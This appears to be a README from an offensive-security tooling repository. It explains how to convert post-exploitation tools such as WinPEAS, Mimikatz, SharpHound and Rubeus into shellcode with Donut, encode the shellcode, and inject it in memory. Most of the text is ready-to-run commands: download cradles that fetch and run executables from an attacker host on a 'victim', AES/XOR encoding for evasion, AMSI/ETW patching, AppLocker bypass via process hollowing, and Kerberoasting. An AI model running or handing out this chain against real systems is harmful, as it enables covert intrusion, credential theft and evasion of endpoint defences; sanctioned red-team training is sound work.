# Binary Packing — Running Any Tool as Shellcode

Convert an arbitrary binary (WinPEAS, Mimikatz, SharpHound, your own .exe) into shellcode,
then deliver it via any loader in this repo.

---

## The Core Idea

Loaders expect raw shellcode. Donut is the bridge that converts a binary into shellcode:

```
YourTool.exe  →  donut  →  shellcode.bin  →  encode  →  loader  →  runs in-memory
```

The resulting shellcode loads the .NET CLR (if needed) into the target process and executes the
tool entirely in memory. Nothing touches disk after delivery.

---

## Tool Types and How to Handle Each

| Binary type | Example | Donut works? | Notes |
|-------------|---------|-------------|-------|
| .NET exe | SharpHound, Seatbelt, WinPEASany | Yes, directly | Best case |
| .NET dll | Rubeus.dll, custom DLL | Yes, specify class+method | See below |
| Native PE (C/C++) | WinPEAS native, Mimikatz | Yes | Donut bootstraps a loader for it |
| PowerShell script | Invoke-Mimikatz.ps1 | No — use `IEX` cradle | Not shellcode-compatible |

---

## Step-by-Step: Native/PE Binary (e.g. WinPEAS)

```bash
# 1. Get the binary (use the .NET version of WinPEAS when possible — cleaner)
#    WinPEASany.exe = .NET, works best
#    winPEASx64.exe = native PE, also works but larger shellcode

# 2. Convert to shellcode with go-donut (use this on Kali ARM — pip donut-shellcode is unreliable)
#    Install (first time):
#      sudo apt install golang-go
#      go install github.com/Binject/go-donut@latest
#      export PATH=$PATH:~/go/bin
go-donut --in winPEASany.exe --out winpeas.bin
# With arguments passed through to the tool:
go-donut --in winPEASany.exe --params "-o C:\Windows\Temp\wp.txt" --out winpeas.bin

# 3. Encode the shellcode
python3 04-encoders/xor/xor_encoder.py winpeas.bin 0xfa --format csharp
# Or AES (better evasion):
python3 04-encoders/aes/shellcode_encoder.py winpeas.bin <KEY> aes -cs

# 4. Paste encoded bytes into a loader — choose based on your environment:
#    basic-injection.cs   → inject into explorer.exe, output appears in Meterpreter
#    sections-runner.cs   → same but avoids VirtualAllocEx (EDR evasion)
#    clhollow.cs          → process hollow svchost, AppLocker bypass
#    DLL_Runner.cs        → compile as DLL, deliver via DLL_Loader.ps1
#
#    See 03-loaders/RUNBOOK.md for the full selection matrix

# 5. Compile the loader (Windows dev box, Visual Studio)
#    See 03-loaders/RUNBOOK.md — "Step 4: Compile"

# 6. Start listener and run
```

---

## Capturing Output

WinPEAS and similar tools write to stdout. When running as shellcode injected into another
process, stdout is lost unless you capture it.

**Option A — inject into your own meterpreter session process:**
```bash
# In Meterpreter, shellcode injected into the same process can write to your session
meterpreter> execute -H -i -f cmd.exe    # interactive — not ideal for shellcode
```

**Option B — use the Reflective PS1 loading chain instead (easier output capture):**
```powershell
# On victim: loads the .NET exe directly, output goes to your PS session
$b = (New-Object System.Net.WebClient).DownloadData('http://<KALI>/WinPEASany.exe')
[System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null, @(,@()))
```
See `03-loaders/reflective/README.md` for the full encrypted pipeline (Invoke-SharpLoader).

**Option C — pipe output in Meterpreter:**
```bash
meterpreter> load powershell
meterpreter> powershell_execute "[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<KALI>/WinPEASany.exe')).EntryPoint.Invoke(`$null,@(,@()))"
```

---

## Step-by-Step: .NET Tool with Arguments (e.g. SharpHound)

```bash
go-donut --in SharpHound.exe --params "-c All --zipfilename loot.zip" --out sharphound.bin

# Encode + inject as above
python3 04-encoders/xor/xor_encoder.py sharphound.bin 0xfa --format csharp
# Paste into basic-injection.cs → compile → run
```

---

## Step-by-Step: .NET DLL (e.g. Rubeus.dll)

```bash
# Specify the namespace, class, and method to call
go-donut --in Rubeus.dll --class Rubeus.Program --method Main --params "kerberoast /nowrap" --out rubeus.bin

# Then encode + inject as above
```

---

## Reflective Loading Alternative (no Donut, .NET only)

For .NET tools, you can skip Donut entirely and use the encrypted Invoke-SharpLoader pipeline:

```bash
# Kali: encrypt the binary
pwsh -c ". ./03-loaders/reflective/Invoke-SharpEncrypt.ps1; Invoke-SharpEncrypt -file WinPEASany.exe -password 'pass123' -outfile winpeas.enc"
python3 -m http.server 80
```

```powershell
# Victim: decrypt + run in memory (AMSI and ETW auto-patched)
IEX (New-Object Net.WebClient).DownloadString('http://<KALI>/Invoke-SharpLoader.ps1')
Invoke-SharpLoader -location "http://<KALI>/winpeas.enc" -password "pass123" -noArgs
```

This approach is better for output capture since everything runs in your PS session.
See `03-loaders/reflective/README.md` for full details.

---

## Decision Guide

```
Is the tool a .NET exe?
    YES → use Invoke-SharpLoader (easiest, output captured, AMSI auto-bypassed)
    NO  → use Donut to convert to shellcode, then inject

Do you need output?
    YES → Invoke-SharpLoader or Assembly.Load() one-liner in PS session
    NO  → any shellcode injection loader works

Is AppLocker active?
    YES → use clhollow.cs or DLL_Loader.ps1 chain after Donut conversion
    NO  → basic-injection.cs or sections-runner.cs
```
